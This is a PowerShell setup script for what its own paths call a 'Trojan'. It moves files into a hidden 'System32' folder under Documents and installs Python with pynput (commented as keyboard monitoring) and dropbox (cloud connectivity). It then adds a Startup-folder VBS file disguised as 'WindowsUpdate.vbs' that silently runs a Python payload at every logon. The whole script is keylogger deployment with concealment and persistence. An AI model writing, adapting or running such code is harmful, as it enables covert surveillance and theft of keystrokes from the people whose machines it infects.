# Requires -RunAsAdministrator

# Configuration paths
$downloadsFolder = "$env:USERPROFILE\Downloads\Trojan"  # Source location
$documentsFolder = "$env:USERPROFILE\Documents\System32"  # Hidden destination
$pythonScript = "run_commands.py"  # Main script to execute
$startupFolder = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Required Python packages for operation
$requiredPackages = @(
    "pynput",     # For keyboard monitoring
    "dropbox",    # For cloud connectivity
    "numpy",      # For image processing
    "pillow"      # For image handling
)

# Function to create and setup hidden location
function Setup-HiddenLocation {
    try {
        # Create destination directory if it doesn't exist
        if (-not (Test-Path $documentsFolder)) {
            New-Item -Path $documentsFolder -ItemType Directory | Out-Null
        }
        
        # Set directory attributes to hidden
        $folder = Get-Item $documentsFolder -Force
        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
        
        # Move all files from source to destination
        Copy-Item -Path "$downloadsFolder\*" -Destination $documentsFolder -Force
        
        # Update script path to new location
        $script:pythonScript = Join-Path $documentsFolder $pythonScript
        
        Write-Host "Files relocated successfully."
    }
    catch {
        Write-Error "Failed to setup hidden location: $_"
        exit 1
    }
}

# Function to verify Python installation
function Test-PythonInstalled {
    try {
        $pythonCmd = Get-Command python -ErrorAction Stop
        Write-Host "Python is installed at: $($pythonCmd.Source)"
        return $true
    }
    catch {
        Write-Host "Python is not installed."
        return $false
    }
}

# Function to install Python if not present
function Install-Python {
    Write-Host "Installing Python $pythonVersion..."
    
    $installerUrl = "https://www.python.org/ftp/python/$pythonVersion/python-$pythonVersion-amd64.exe"
    $installerPath = "$env:TEMP\python-installer.exe"
    
    try {
        # Download and run Python installer silently
        Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath
        Start-Process -FilePath $installerPath -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1' -Wait
        Remove-Item $installerPath -Force
        Write-Host "Python installation completed successfully."
        
        # Update PATH environment variable
        $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + 
                   [System.Environment]::GetEnvironmentVariable("Path","User")
    }
    catch {
        Write-Error "Failed to install Python"
        exit 1
    }
}

# Function to install required Python packages
function Install-PythonPackages {
    Write-Host "Installing required Python packages..."
    
    foreach ($package in $requiredPackages) {
        Write-Host "Installing $package..."
        try {
            $output = python -m pip install $package 2>&1
            if ($LASTEXITCODE -eq 0) {
                Write-Host "$package installed successfully."
            } else {
                Write-Host "Failed to install $package"
                Write-Host $output
                exit 1
            }
        }
        catch {
            Write-Host "Error installing $package"
            Write-Host $_.Exception.Message
            exit 1
        }
    }
}

# VBS script template for hidden execution
$vbsScript = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c cd $documentsFolder && python $pythonScript", 0
Set WshShell = Nothing
"@

# Main execution block
try {
    # First relocate files to hidden location
    Setup-HiddenLocation
    
    # Check and install Python if needed
    Write-Host "Checking Python installation..."
    if (-not (Test-PythonInstalled)) {
        Install-Python
    }

    # Update pip to latest version
    Write-Host "Updating pip..."
    python -m pip install --upgrade pip

    # Install required packages
    Install-PythonPackages

    # Create startup entry
    $vbsPath = "$startupFolder\WindowsUpdate.vbs"
    
    # Verify Python script exists in new location
    if (-not (Test-Path $pythonScript)) {
        Write-Error "Python script not found at: $pythonScript"
        exit 1
    }

    # Create VBS file for startup
    $vbsScript | Out-File -FilePath $vbsPath -Encoding ASCII

    # Final verification
    try {
        $pythonVersion = python --version
        Write-Host "Setup completed successfully:"
        Write-Host "Python version: $pythonVersion"
        Write-Host "Hidden location: $documentsFolder"
        Write-Host "Startup entry: $vbsPath"
    } catch {
        Write-Host "Setup verification failed. Please check error messages."
        exit 1
    }

} catch {
    Write-Error "Setup failed: $_"
    exit 1
}